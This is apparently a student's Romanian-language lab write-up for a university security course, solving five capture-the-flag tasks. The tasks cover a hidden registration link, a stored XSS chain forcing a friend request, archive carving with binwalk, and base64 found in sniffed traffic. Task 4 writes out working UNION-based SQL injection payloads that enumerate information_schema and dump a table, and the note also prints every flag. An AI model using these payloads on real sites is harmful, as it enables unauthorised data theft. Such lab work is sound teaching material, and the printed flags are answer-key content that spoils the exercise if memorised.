Stefan Diana - 332CC
TEMA 2 ISC 

TASK 1:
    -> Am rulat scriptul "connect.sh", si am aflat adresa ip si portul prin comanda 
    "nmap" (172.32.57.1, 80).
    -> Am rulat scriptul "webtunnel.sh" cu argumentele gasite, pentru a crea tunelul.
    -> Am deschis site ul in browser si am observat ca butonul "Register" conduce catre 
    "http://localhost:8080/auth/fake_register".
    -> Am inspectat codul html si am gasit link ul corect 
    ("http://localhost:8080/auth/register_real_one"), unde am creat un nou cont si apoi 
    m-am conectat.
    -> Am dat iar "Inspect" si in sursa am gasit flag ul: 
    SpeishFlag{xjzHAl9ZzDAZu4v6LdvDGlmmF3fl3Ez4}.

TASK 2:
    -> Mesajele postate de Boss sunt vizibile doar pentru prietenii acestuia, ceea ce 
    inseamna ca trebuie sa ma adauge la prieteni, insa nu accepta cereri.
    -> Se face un atac XSS prin mesaje, cum este prezentat in hint uri.
    -> Nu se poate trimite un mesaj direct catre Boss, deoarece nu suntem prieteni.
    -> L-am adaugat ca prieten pe Kat Nyan, singurul de la care aveam o cerere, pentru 
    a trimite mesaje catre el.
    -> I-am trimis un script pe care, cand il executa, sa ii trimita lui Boss un al doilea 
    script, care consta in apelarea functiei "addFriendProfile", gasita in codul sursa, 
    pentru a il forta sa ne dea o cerere de prietenie.
    -> In mesajul postat de Boss am gasit flag ul: 
    SpeishFlag{vr1kCps2dt28fzX8IHXyJyoaL5BcjFEj}.

TASK 3:
    -> Am dat comanda "curl http://localhost:8080/backup.sh", dupa hint ul din postarea 
    lui Boss, si am rulat continutul.
    -> Am observat ca se alipsesc doua arhive, iar numele rezultatului are formatul unei 
    date, deci am incercat variante pana am gasit data corecta (2023-12-29).
    -> Am folosit utilitarul binwalk pentru a afla indexul de la care incepe fiecare 
    arhiva.
    -> Am extras a doua arhiva, folosind offset ul, am dezarhivat-o si am obtinut flag ul: 
    SpeishFlag{TTFzaY13LRyqqDg6BzjfB2qnwhc1vXBj}.

TASK 4:
    -> Fiind vorba de SQL injection, m am gandit ca baza de date s ar putea lega de 
    utilizatori.
    -> Am incercat comenzi de SQL injection in mai multe adrese url ale site ului si am 
    observat ca baza de date returneaza o eroare la adresa "http://localhost:8080/inside/p/".
    -> Ca sa aflu numarul de coloane, am incercat mai multe variante de forma 
    "'UNION SELECT NULL,NULL,..,NULL --;", pana s-a intors ceva valid. Am aflat ca sunt 8 
    coloane.
    -> Am aflat table_schema (web_485) adaugand secventa: 
    ' UNION SELECT 1, 2,group_concat(distinct(table_schema)),4,5,6,7,8 FROM 
    information_schema.tables -- ;
    -> Am aflat numele tabelului (flags40243), prin: 
    ' UNION SELECT 1, 2,group_concat(distinct(table_name)),4,5,6,7,8 FROM 
    information_schema.tables WHERE table_schema='web_485' -- ;
    -> Am aflat numele coloanei (zaflag), prin: 
    ' UNION SELECT 1, 2,group_concat(column_name),4,5,6,7,8 FROM information_schema.columns 
    WHERE table_schema='web_485' AND table_name='flags40243' -- ;
    -> Am aflat flag ul prin: ' UNION SELECT 1, 2,zaflag,4,5,6,7,8 FROM flags40243 -- ;
    -> Flag ul gasit este: SpeishFlag{bA9HlVmOnzVilKvuZ68tlon3O0CQROq7}.

TASK 5:
    -> Am dat tcpdump pe interfata eth0 ca sa observ traficul.
    -> Am preluat partea encodata cu base64 dintre sirul de "NYAN" si am decodat-o.
    -> Am obtinut flag ul: SpeishFlag{mBKw2rxC2k8zRlBILouykBvzeGac9t7s}.